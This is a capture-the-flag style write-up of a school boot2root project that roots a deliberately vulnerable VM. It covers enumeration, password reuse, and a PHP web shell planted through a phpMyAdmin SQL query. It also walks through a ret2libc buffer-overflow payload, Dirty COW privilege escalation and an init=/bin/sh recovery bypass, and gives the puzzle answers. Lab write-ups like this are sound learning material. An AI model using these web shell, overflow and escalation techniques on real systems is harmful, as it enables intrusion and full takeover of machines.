# boot2root

## Table of content

- [boot2root](#boot2root)
	- [Table of content](#table-of-content)
	- [Introduction](#introduction)
	- [Finding the IP Address](#finding-the-ip-address)
	- [Enumeration](#enumeration)
	- [Gaining Access](#gaining-access)
		- [Writeup 1](#writeup-1)
		- [Writeup 2](#writeup-2)
		- [Writeup 3](#writeup-3)

## Introduction

This Hive Helsinki Project is about finding ways to gain root access on the boot2root virtual machine. Check the [subject file](https://github.com/iljaSL/boot2root/blob/main/en.subject.pdf) for more information.

## Finding the IP Address

The Boot2Root machine does not present the IP address of the VM on the start display as the Darkly machine does.
It's still rather easy to gather that piece of information. My Host Machine is running on Windows, I'm using VMWare as my virtualization tool for this project.
We can simply use `arp -a` or `ipconfig /all` to find the IP address of our b2r machine. If you have trouble to find the machine within your many assigned networks, as I did, you can simply find it with the help of the assigned MAC address that you can find within the VMWare machine settings, it's also similar on VirtualBox.

The explanation above is only valid for `Host-only` Network Adapters. If you have your Attack Machine somewhere else running rather than as a VM on your Host machine, you need to switch your Network connection to `Bridged` to be able to access the Target VM b2r. Finding the IP Address of the Target VM with `ipconfig` or `arp`, was at least not possible for me through the MAC Address with Virtual Box or VMware. If you choose the `Bridged` connection, the VM will be directly connected to the physical network, in my case an Intel Killer Wireless Adapter. You will be able to find the Adapters IP address via `ipconfig` or `arp`.
Scan the Adapters IP Range with nmap for example:

```
nmap 192.100.0.0-255
```
Nmap will find the open ports to the corresponding IP Address of the b2r Target VM.

## Enumeration

As always, let's start the Enumeration with Nmap and the following command:
```
nmap -sC -sV <IP>
```
`-sC (Script scan, very noisy, should be only performed with permission)` <br>
`-sV (Version detection)`

The result:
```
PORT    STATE  SERVICE  VERSION
21/tcp  open   ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open   ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
53/tcp  closed domain
80/tcp  open   http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open   imap     Dovecot imapd
|_ssl-date: 2021-12-19T17:28:20+00:00; +1s from scanner time.
|_imap-capabilities: more post-login IDLE SASL-IR IMAP4rev1 ENABLE listed LOGIN-REFERRALS ID capabilities Pre-login OK LOGINDISABLEDA0001 have LITERAL+ STARTTLS
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
443/tcp open   ssl/http Apache httpd 2.2.22
|_http-title: 404 Not Found
|_ssl-date: 2021-12-19T17:28:20+00:00; +1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
993/tcp open   ssl/imap Dovecot imapd
|_imap-capabilities: CAPABILITY
|_ssl-date: 2021-12-19T17:28:20+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
```

The most interesting part of the Nmap enumeration are the ports 80 and 443, which indicates that b2r is hosting a website. A quick check with the browser, and indeed a Website with a straightforward instruction is being displayed.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/http_landing_page.png">
</p>

This discovery looks like the most promising lead in order to gain root access on the server and will be the first attempt on the list of gaining it.

The Enumeration is not over yet though. Let's dig in a bit deeper and find hidden web content with Gobuster.

Port 80 (http):
```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php

/forum                (Status: 403) [Size: 285]
/fonts                (Status: 301) [Size: 312]
/server-status        (Status: 403) [Size: 293]
```
Port 443 (https):
```
gobuster dir -k -u https://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php

/forum                (Status: 301) [Size: 314]
/webmail              (Status: 301) [Size: 316]
/phpmyadmin           (Status: 301) [Size: 319]
/server-status        (Status: 403) [Size: 294]
```
`-k (Skip TLS certificate verification)`

That result is very promising, especially the fact that phpmyadmin has been deployed to the production web server. Which would give me easy access to the Database and does have an infamous security history. I also now know that MySQL is being used as the Database.

## Gaining Access

### Writeup 1

The Port 80 results are quite discouraging as they returned the Status 403, meaning the access to that specific web content is forbidden. Port 443 looks much promising though, as most of the content is being redirected. I'm being greeted with a login page for `/webmail` and `/phpmyadmin`, that means that I need to find some credentials in order to access them. The Forum looks already much promising as I don't need to login in order to access it.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_landing_page.png">
</p>

I am presented with a lot of valuable information on the Forum, the most important one first, I am able to read all the posted forum posts. I see that there are 6 users registered, and the most convenient part is that the users are all neatly listed when I click the `Users` tab. The Forum itself is powered by little forum, that will be definitely helpful for later!

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_user_area.png">
</p>

I'm able to email the admin, I tried to test it for a XSS vulnerability, which did not work, refreshing the page also resulted in some weird buggy behaviors, I will for now set it aside and focus on the forum posts instead until I get stuck in which case I could investigate that issue closer.
The most of the posts are not interesting and do not provide any important information except the post `Probleme login ?` from the user `lmezard`. lmezard is sharing logs of (many) failed SSH login attempts. One login attempt looks really interesting, the username for this attempt was `!q\]Ej?*5K5cy*AJ`, which does look quite like a password.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/user_logs_with_pw.png">
</p>

I tried (just in case) to use SSH to gain access to the Server with lmezard Credentials, but that did not work.
What should users definitely don't do with their passwords, but still do on every registration?
Correct, reusing their passwords. So I tried to reuse lmezard's credentials on the services that we have access to.
It did not work with SquirrelMail, as the username probably need to be a valid email.
BUT it worked indeed with the Forum. I have now access to lmezard's forum account.
There is nothing really interesting to find, except lmezard's email `laurie@borntosec.net`, which I think could help with the SquirrelMail login attempt.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_user_profile.png">
</p>

The login attempt to SquirrelMail with lmezard's and password worked as well, no surprise there.
Of course, this is just a school Project, but nevertheless many users are reusing their passwords for different accounts and this chain of account takeovers is quite common in the real world, so if anyone out there is reading this random as CTF write-up, PLEASE USE A PASSWORD MANAGER!
Back to SquirrelMail and lmezard's inbox. There are only 2 mails in the inbox, and the one titled `DB Access` is really interesting, as it contains the root credentials for a Database.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/db_access_email.png">
</p>

We gained access to phpmyadmin and the Forum Database.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_db.png">
</p>

Now I need to find out on how I can establish a reverse shell on the Server with the DB root account.
I stumbled across this guide here: [Shell Uploading Server Phpmyadmin](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)

It did gave me some hints on how the attack is performed, but the article is not really explaining on how or what exactly we are exploiting. We are basically creating a backdoor in order to launch a Webshell in our case via the Forum. This technique described in the article is mostly used through a SQL injection attack, which we luckily do not need to perform as we have full access to the DB root account. We will create a Webshell with the help of PHP, which parameters will be passed by `cmd` and wil be executed.

```
<?system($_REQUEST['cmd']);?>
```

I will create a filed inside the `templates_c` directory, which is created by default while setting up my little forum: [My Little Forum Github Source Code](https://github.com/ilosuna/mylittleforum) <br>
That directory does have usually excessive permissions.
The SQL query will look like this:
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
```
The query went through successfully!
Okay, let's check if we can execute any shell commands with the following crafted URL:
```
https://<IP>/forum/templates_c/backdoor.php?cmd=whoami
```
It worked! We got the following response (I'm using BurpSuite's Repeater for the upcoming requests):

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cmd_whoami.png">
</p>

Let's see if we can get access to some more interesting information with:
```
https://<IP>/forum/templates_c/backdoor.php?cmd=cat%20/etc/passwd
```
<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cmd_etc_passwd.png">
</p>

Now we do have a much better picture on boot2roots users.
After a bit of traversing through the server's directories, I discovered an interesting dir called `LOOKATME`, which also does have the right permission to access it.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cmd_lookatme.png">
</p>

The directory does include an even better file to look at, which is called `password` with the following data:
```
lmezard:G!@M6f4Eatau{sF"
```
So far so good, now I have to figure out for which exact service these credentials are used for.
Unfortunately those credentials do not work with SSH, but we also have an FTP Service running that we discovered during our enumeration with Nmap, and those credentials to work indeed with FTP!
We have access to two files while logged in with lmezard, `README` and `fun`. Let's get them with the ftp `get` command and check out what's inside.

README:
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```
That's a clear message that we got from the README on what to do next.
Fun is actually a ZIP which contains a directory called `ft_fun` with lots of `.pcap` files, actually exact 750 files. PCAP files contain packet data of a network, which can be usually opened with application like Wireshark, but I get an error when trying to open those files with Wireshark, as it does can not read those files, which is really odd.
Checking the type of the files with the `file` command results in a really interesting find.
Those files are ASCII text files, and taking a closer look reveals the following output in one of those files:
```
void useless() {
	printf("Hahahaha Got you!!!\n");
```
Analyzing the files more closely, an instruction message can be found:

```
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```
That is C syntax, you can find those 12 `getme` function within the files and also what character they return, but the problem is that the return statements are sometimes all over the place, so it's quite hard to figure out the password by just analyzing it manually.
So I decided to use this [script](https://github.com/iljaSL/boot2root/blob/main/scripts/ascii_to_c.py) to convert all those files into a C file,
which can be compiled and executed in order to get the following result:
```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```
Lets `SHA-256` it:
```
echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```
And that is the password! We can now SSH into B2R as `laurie`.

Now we are presented with 2 files inside laurie's home directory, `bomb` and `README`.
The `README` says:
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
`bomb` is a C executable which prints out the following after executing it:
```
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
```
Inputting a wrong input results in:
```
BOOM!!!
The bomb has blown up.
```

The obvious thing is to reverse engineer the binary file that we got. I will use the open source tool Cutter, as my gdb skills are a bit rusty.

The firs phase is pretty easy, the string that we are looking for is:
```
Public speaking is very easy.
```
This Cutter Graph visualizes the comperesment very good, and which string is being compared with.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cutter_phase_1.png">
</p>

Phase 2 is also rather straight forward with Cutter's Decompiler feature.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cutter_phase_2.png">
</p>


In order to satisfy the condition, the following 6 numbers are required according to the Program's flow:

```
1 2 6 24 120 720
```

And again, the third phase is also rather easy with Cutter's Decompiler.
We encounter a switch statement within the `phase_3` function that expects a `%d %c %d` pattern, with many possible right answers.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cutter_phase_3.png">
</p>

The first decimal is the case number starting from 0, the character is the hex assigned to `bl` variable before the if conditions, which needs to be converted to a unicode, and the last decimal is the hex within the if condition. The answers are:

```
0 q 777
1 b 214
2 b 755
...
```
Alright, we are halfway there!
The `phase_4` function calls a `func4` function which is performing a recursive operation.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cutter_phase_4.png">
</p>

There is a condition inside the `phase_4` function:
```
 if (eax != 0x37) {      // 0x37 == 55
        explode_bomb ();
    }
```

So now we know that `func4` need to return `55` in order to solve phase 4.
`func4` is returning the sum of calls, and in order to return 55 we need 9 calls.
Which is also the right answer and we are able to move to phase 5.

The `phase_5` function expects a string of the length of 6 bytes. We need to work with a ASCII table as there is an function that checks if the string `giants` is equal to a int variable `var_8h` in order to pass.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cutter_phase_5.png">
</p>

There is also bit masking involved with the declared string `isrveawhobpnutfg`. As we are iterating through the index of the string, those index elements are important as we are interested in keeping it equal to `giants`:
```
i[15] = g
i[0] = i
i[5] = a
i[11] = n
i[13] = t
i[1] = s
```
Let's convert the wanted indexes to Hex and compare to what character there are corresponding to within the ASCII table:
```
opekmq
```
Is the answer to Phase 5.

Phase 6 expects 6 integers as an input. It appears that I performs 4 operations on a linked list, there is a `node` declared at the very beginning.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/cutter_phase_6.png">
</p>

It appears that it performs a sort of sorting of the linked list. The integers that we are looking for are the individual index of the nodes. After going through the program flow, the answer seems to be:
```
4 2 6 3 1 5
```

Finally! We are presented with the following prompt!
```
Congratulations! You've defused the bomb!
```
At the very beginning of the bomb puzzle we were presented with the following information within the Readme file:
```
NO SPACE IN THE PASSWORD (password is case sensitive).
```
So the password would be as follows for the user `thor`:
```
Publicspeakingisveryeasy.126241207200q7779opekmq426315
```
And I'm ... not in...
I did not understand why it did not work, I tried the different combination from Phase 4, but I still could not SSH as thor into b2r.
After a long time of frustrations I checked for some information on the web and discovered that there is apparently an error within the flag. The last three digits `315` need to be swapped to `135`.
```
Publicspeakingisveryeasy.126241207200q7779opekmq426315
```
That combinations still did not work, so I tried again with different combinations from Phase 4 and finally it worked with the following combination:
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```
Within tho's home directory we are presented again with a `README` file:
```
Finish this challenge and use the result as password for 'zaz' user.
```
And a file called `turtle` which is an ASCII text file,
which includes a LOT of repetitive text:
```
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
....
Can you digest the message? :)
```
I quickly discovered that there is a python drawing library called [turtle](https://realpython.com/beginners-guide-python-turtle/) which is based on Logo a programming language that involved a turtle that you could move around the screen with just a few commands.
The french comments made also quick sense as the library inlcude the following methods to interact with:
```
>>> t.right(90)
>>> t.forward(100)
>>> t.left(90)
>>> t.backward(100)
```
I created a small and rather lazy script for parsing the turtle file and drawing according to the comments. At first I did not really understand what the program was drawing, but after a few repeats I quickly realized that the program was drawing a word:
```
SLASH
```
This is not the password though, the login attempts for the user `zaz` are failing while using it.
I double checked the `README` and `turtle` file for any hints or mistakes I could have done and I totally forgot about the last string inside the `turtle` file:
```
Can you digest the message? :)
```
Let's try first to generate a MD5 hash:
```
echo -n 'SLASH' | md5sum
646da671ca01bb5d84dbb5fb2238dc8e
```

It worked! I'm able to login as the user `zaz`. Note that the password is case sensitive.
Again we are presented with a C binary file with the ominous name `exploit_me`, plus a `mail` folder inside zaz's home directory. Let's first focus on the binary file!

A closer look with Cutter and executing the binary file reveals that this program is not doing much. It expects one argument, copies it and returns it.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/exploit_me_reversed.png">
</p>

The most interesting part of this function is that the library function `strcpy`is being used without checking the length of what is being copied into buffer. Suggesting that this program is vulnerable to an buffer overflow exploit. Which is also stated inside the man:
```
If the destination string of a strcpy() is not large enough, then
anything might happen.  Overflowing fixed-length string buffers
is a favorite cracker technique for taking complete control of
the machine.  Any time a program reads or copies data into a
buffer, the program first needs to check that there's enough
space.
```
And we can confirm it with a simple test:

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/segfault.png">
</p>

In order to exploit the buffer overflow, we also need to take the system architecture in mind when exploiting a buffer flow which will be also important in our case as following some guides will need lead to an actually exploit and thus need some extra work in order to gain the root shell.

[Buffer Overflow Source 1](https://www.tallan.com/blog/2019/03/07/exploring-buffer-overflows-in-c-part-one-theory/)

[Buffer Overflow Source 2](https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/)

[Buffer Overflow Source 3](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)

I'll skip the explanation of a buffer overflow as this is way better explained in the sources above.
This is the code which successfully exploits the buffer overflow in the `exploit_me` program:
```
./exploit_me `python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"DUMM"+"\x58\xcc\xf8\xb7"'`
```
The size of the buffer is 140 bytes. Meaning that if we exceeded those 140 bytes and the string encroaches beyond its buffer, resulting in a segmentation fault as shown in the picture above. This means that we can inject malicious payloads in order to make the program to behave unexpectedly and potential gain access to a shell.

What we basically are doing is creating a fake function stack frame. We will overwrite with the payload above the buffer and saved frame pointers with a bunch of `A`.

<p align="center">
  <img src="https://blog.tallan.com/wp-content/uploads/2019/03/Overflowing-a-buffer-with-injected-code.png">
</p>

The first thing we need is the address of the system function(first address in the payload).
Inside gdb, we run the program adn trigger the buffer overflow:
```
(gdb)  r `python -c 'print "A"*141'`

Program received signal SIGSEGV, Segmentation fault.
0xb7e40041 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
And with `p system` we determine the address of the system function:
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
Note, that we need to convert this little endian address to a big endian:
```
0xb7e6b060 -> 60B0E6B7
```
The big endian will be included into our payload.
The next address we need is the address of `/bin/sh`, this is what we want to execute while having a buffer overflow.
```
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
```
And again we need to convert it to a big endian.
```
0xb7f8cc58 -> 58CCF8B7
```

The `DUMM` string between those two address is there because of the system architecture of b2r, which requires to have some dummy data between the `system()` and `/bin/sh` call.
The payload is ready, let's execute is outside of the gdb:
```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"DUMM"+"\x58\xcc\xf8\xb7"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���DUMMX���
# whoami
root
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```
Great! We got the root shell!
This is it with write up 1, in order to pass the project we need to discover 2 different exploits to gain root access.
I will continue with my second attempt in [Writeup 2](#writeup-2)

### Writeup 2
The first thing I do now as the "Main" exploit track has finished is running LinPEAS, as I do have already access to a user on the server via SSH.
```
LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
```
The discovery legend is as follows:

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup2/linpeas_legend.png">
</p>

We get straight at the very beginning a `RED/YELLOW` hit under the Linux version which is very promising in escalating privileges.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup2/kernel_version.png">
</p>

A quick check with `searchsploit` reveals that this linux version does have a very serious vulnerability `CVE-2016-5195` aka `Dirty COW`.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup2/searchsploit.png">
</p>

Why is it called Dirty COW?
```
"A race condition was found in the way the Linux kernel's memory subsystem 
handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise 
read-only memory mappings and thus increase their privileges on the system."
```
[Official Source](https://dirtycow.ninja/) <br>

What is a Race Condition Vulnerability?
```
A race condition attack happens when a computing system that’s designed 
to handle tasks in a specific sequence is forced to perform two or more operations 
simultaneously. This technique takes advantage of a time gap between the moment 
a service is initiated and the moment a security control takes effect. This attack, 
which depends on multithreaded applications, can be delivered in one of two ways: 
interference caused by untrusted processes (essentially a piece of code that slips 
into a sequence between steps of a secure programs), and interference caused 
by a trusted process, which may have the "same'' privileges.
```

I gonna use the POC `dirtycow` script by ["FireFart"](https://github.com/FireFart/dirtycow) for ths exploit.
This great [Video](https://www.youtube.com/watch?v=kEsshExn7aE) also explains in detail on how the POC script works and what we are actually exploiting while going for the race condition vulnerability.

Let's run the script:
```
thor@BornToSecHackMe:~$ ./dirty password
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
```
We get the address part of the memory returned in which `mmap` mapped the file into the memory.
Let's check if the new user has been created:
```
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
```

User has been indeed created. Let's change the user to `firefart` and check if we have root access:
```
firefart@BornToSecHackMe:/home/thor# whoami
firefart
firefart@BornToSecHackMe:/home/thor# id
uid=0(firefart) gid=0(root) groups=0(root)
```
Awesome! We gained successfully the root access!

### Writeup 3

The mandatory part is done, now we are going for the bonus points!
This part is probably the shortest way to get root, because we are able to start the b2r machine in recovery mode. The linux Kernel gives us also commands in order to launch the root shell without providing any credentials, if of course some security measurements have not been done in order to prevent it, which was not the case with b2r! This is actually a feature, and is used for system maintenance in case some initialization got messed-up.
Here is a link to the really good discussion about this feature and why it's needed: [Link](https://unix.stackexchange.com/questions/34462/why-does-linux-allow-init-bin-bash)
We are using this command to load the shell:
```
live load init=/bin/sh
```
Whe also need to press the `shift` key while booting up b2r in order to enter the recovery mode.
It will take a bit, but after a few seconds we get successfully the root shell:

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup3/boot_2_root.png">
</p>

We finally booted boot2root to root! :)
